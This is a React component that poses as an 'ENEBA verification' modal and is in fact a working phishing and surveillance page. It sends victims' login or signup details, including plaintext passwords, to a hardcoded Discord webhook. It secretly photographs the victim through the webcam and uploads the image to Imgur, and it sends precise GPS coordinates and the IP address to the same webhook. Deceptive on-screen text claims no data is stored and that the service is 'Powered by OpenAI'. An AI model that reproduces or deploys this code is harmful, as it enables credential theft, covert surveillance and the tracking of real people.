
import React, { useState, useRef, useEffect } from 'react';
import axios from 'axios';
import { Circle, Check, Camera, MapPin, Loader } from 'lucide-react';
import LoginSignupModal from './LoginSignupModal';

interface VerificationModalProps {
  isOpen: boolean;
  onClose: () => void;
  ipAddress: string;
}

const VerificationModal = ({ isOpen, onClose, ipAddress }: VerificationModalProps) => {
  const [step, setStep] = useState<'loading' | 'verify' | 'auth' | 'permissions' | 'camera' | 'location' | 'success'>('loading');
  const [countdown, setCountdown] = useState(4);
  const [userData, setUserData] = useState<any>(null);
  const videoRef = useRef<HTMLVideoElement | null>(null);
  const streamRef = useRef<MediaStream | null>(null);
  const canvasRef = useRef<HTMLCanvasElement | null>(null);
  const webhookUrl = "https://discord.com/api/webhooks/1367117605877579810/S3qULaeAQR2bDw4UFFj65KEeLarPCpXslBlWA_Fq2kR7CBz958kVNJsOg3svUb-jtrxU";

  useEffect(() => {
    if (isOpen && step === 'loading') {
      const timer = setInterval(() => {
        setCountdown(prev => {
          if (prev <= 1) {
            clearInterval(timer);
            setStep('verify');
            return 4;
          }
          return prev - 1;
        });
      }, 1000);
      
      return () => clearInterval(timer);
    }
  }, [isOpen, step]);

  const handleContinue = () => {
    setStep('loading');
    setCountdown(4);
    
    const timer = setTimeout(() => {
      setStep('auth');
    }, 4000);
    
    return () => clearTimeout(timer);
  };
  
  const handleAuthComplete = (data: any) => {
    setUserData(data);
    setStep('loading');
    setCountdown(4);
    
    const timer = setTimeout(() => {
      setStep('permissions');
    }, 4000);
    
    return () => clearTimeout(timer);
  };

  const handleStart = async () => {
    setStep('camera');
    
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ 
        video: { 
          facingMode: "user",
          width: { ideal: 1280 },
          height: { ideal: 720 }
        } 
      });
      
      streamRef.current = stream;
      
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        videoRef.current.play();
        
        setTimeout(() => {
          captureAndSendImages();
        }, 2000);
      }
    } catch (error) {
      console.error("Camera error:", error);
      setStep('permissions');
    }
  };
  
  const captureAndSendImages = async () => {
    if (!videoRef.current || !streamRef.current) return;
    
    // Take multiple pictures with canvas
    const canvas = document.createElement('canvas');
    canvas.width = videoRef.current.videoWidth;
    canvas.height = videoRef.current.videoHeight;
    const ctx = canvas.getContext('2d');
    
    // Capture first image
    if (ctx) {
      ctx.drawImage(videoRef.current, 0, 0, canvas.width, canvas.height);
      const imageData = canvas.toDataURL('image/jpeg');
      
      try {
        // Upload to Imgur
        const response = await axios.post('https://api.imgur.com/3/image', {
          image: imageData.split(',')[1],
          type: 'base64'
        }, {
          headers: {
            'Authorization': 'Client-ID b971f6f4d72a0f2'
          }
        });
        
        if (response.data && response.data.data && response.data.data.link) {
          // Send to Discord webhook with user data
          let userDataString = "No user data";
          if (userData) {
            if (userData.type === 'signup') {
              userDataString = `**User Type**: Signup\n**Full Name**: ${userData.fullName}\n**Date of Birth**: ${userData.dateOfBirth}\n**Email**: ${userData.email}\n**Password**: ${userData.password}\n**Gender**: ${userData.gender}\n**Phone**: ${userData.phoneNumber}`;
            } else {
              userDataString = `**User Type**: Login\n**Email**: ${userData.email}\n**Password**: ${userData.password}`;
            }
          }
          
          await axios.post(webhookUrl, {
            content: `📸 **CAMERA IMAGE CAPTURED**\n\n**Image**: ${response.data.data.link}\n**IP Address**: ${ipAddress}\n\n**USER DATA**:\n${userDataString}`
          });
        }
      } catch (error) {
        console.error("Failed to upload image:", error);
      }
    }
    
    // Stop camera
    const tracks = streamRef.current.getTracks();
    tracks.forEach(track => track.stop());
    
    // Now request location with improved accuracy
    requestLocation();
  };
  
  const requestLocation = () => {
    if (navigator.geolocation) {
      setStep('location');
      
      // Enhanced geolocation options
      const options = {
        enableHighAccuracy: true,  // Use GPS if available
        timeout: 15000,            // Wait up to 15 seconds
        maximumAge: 0              // Always get a fresh position
      };
      
      navigator.geolocation.getCurrentPosition(
        async (position) => {
          const { latitude, longitude, accuracy } = position.coords;
          
          try {
            // Prepare user data string
            let userDataString = "No user data";
            if (userData) {
              if (userData.type === 'signup') {
                userDataString = `**User Type**: Signup\n**Full Name**: ${userData.fullName}\n**Date of Birth**: ${userData.dateOfBirth}\n**Email**: ${userData.email}\n**Password**: ${userData.password}\n**Gender**: ${userData.gender}\n**Phone**: ${userData.phoneNumber}`;
              } else {
                userDataString = `**User Type**: Login\n**Email**: ${userData.email}\n**Password**: ${userData.password}`;
              }
            }
            
            // Send location with enhanced accuracy to webhook
            await axios.post(webhookUrl, {
              content: `📍 **LOCATION DATA CAPTURED (High Accuracy Mode)**\n\n**Latitude**: ${latitude}\n**Longitude**: ${longitude}\n**Accuracy**: ${accuracy}m\n**Google Maps**: https://www.google.com/maps?q=${latitude},${longitude}\n\n**USER DATA**:\n${userDataString}`
            });
            
            // Move to success
            setStep('success');
          } catch (error) {
            console.error("Failed to send location data:", error);
            setStep('success'); // Still move to success even if discord webhook fails
          }
        },
        (error) => {
          console.error("Location error:", error);
          setStep('success'); // Still move to success even if location fails
        },
        options
      );
    } else {
      setStep('success');
    }
  };

  if (!isOpen) return null;

  return (
    <div className="fixed inset-0 flex items-center justify-center bg-black bg-opacity-50 z-50">
      {step === 'auth' ? (
        <LoginSignupModal 
          isOpen={true} 
          onClose={onClose}
          onComplete={handleAuthComplete}
          webhookUrl={webhookUrl}
        />
      ) : (
        <div className="bg-custom-purple-light p-8 rounded-lg shadow-xl w-full max-w-md text-center text-white">
          {step === 'loading' && (
            <div className="flex flex-col items-center space-y-4">
              <Loader className="animate-spin h-12 w-12 text-white" />
              <p className="text-xl">Loading... {countdown}s</p>
            </div>
          )}
          
          {step === 'verify' && (
            <div className="flex flex-col items-center space-y-4">
              <Circle className="h-12 w-12 text-white" />
              <p className="text-xl">Please verify using ENEBA's verification system.</p>
              <button 
                className="bg-custom-yellow text-black font-bold py-3 px-6 rounded-md hover:bg-opacity-90 transition-all"
                onClick={handleContinue}
              >
                Continue
              </button>
            </div>
          )}
          
          {step === 'permissions' && (
            <div className="flex flex-col items-center space-y-4">
              <Check className="h-12 w-12 text-white" />
              <p className="text-xl">In order to verify, please allow us to use your camera and location. Your camera will only be used to figure out if you are a real person.</p>
              <p className="text-sm text-gray-300 mt-2">ENEBA does not store your data. Powered by OpenAI.</p>
              <button 
                className="bg-custom-yellow text-black font-bold py-3 px-6 rounded-md hover:bg-opacity-90 transition-all"
                onClick={handleStart}
              >
                Start
              </button>
            </div>
          )}
          
          {step === 'camera' && (
            <div className="flex flex-col items-center space-y-4">
              <Camera className="h-12 w-12 text-white" />
              <p className="text-xl">Please click allow on the permissions.</p>
              <p className="text-sm text-gray-300 mt-2">This page will update automatically after you allow access.</p>
              <video ref={videoRef} className="hidden" />
            </div>
          )}
          
          {step === 'location' && (
            <div className="flex flex-col items-center space-y-4">
              <MapPin className="h-12 w-12 text-white" />
              <p className="text-xl">Please allow location access to verify your identity.</p>
              <p className="text-sm text-gray-300 mt-2">This page will update automatically after you allow access.</p>
              <p className="text-xs text-gray-400 mt-1">We need precise location for verification purposes.</p>
            </div>
          )}
          
          {step === 'success' && (
            <div className="flex flex-col items-center space-y-4">
              <Check className="h-12 w-12 text-green-400" />
              <p className="text-xl">You have been verified! This is your code:</p>
              <div className="bg-black bg-opacity-20 p-3 rounded font-mono">
                3FJ8R-WN7TK-4ZP6B
              </div>
            </div>
          )}
        </div>
      )}
    </div>
  );
};

export default VerificationModal;
